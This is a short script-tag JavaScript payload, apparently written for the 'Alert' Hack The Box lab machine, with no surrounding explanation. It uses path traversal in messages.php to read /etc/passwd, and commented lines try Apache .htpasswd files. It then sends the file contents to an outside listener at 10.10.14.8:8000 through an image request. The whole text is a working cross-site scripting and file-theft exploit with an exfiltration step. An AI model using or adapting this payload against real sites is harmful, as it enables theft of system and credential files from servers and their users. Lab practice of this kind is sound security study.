

<script>
let f = async () => {
    // let a = await fetch('http://alert.htb/messages.php')
    // let a = await fetch('http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt')
    // let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/htpass/.htpasswd')
    // let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/.htpasswd')
    let a = await fetch('http://alert.htb/messages.php?file=../../../../../../../../etc/passwd')
        .then(response => response.text())
        .then(r => {
            console.log(r);
            let image = new Image();
            image.src="http://10.10.14.8:8000/?c="+r
        })
}
a = f()
</script>
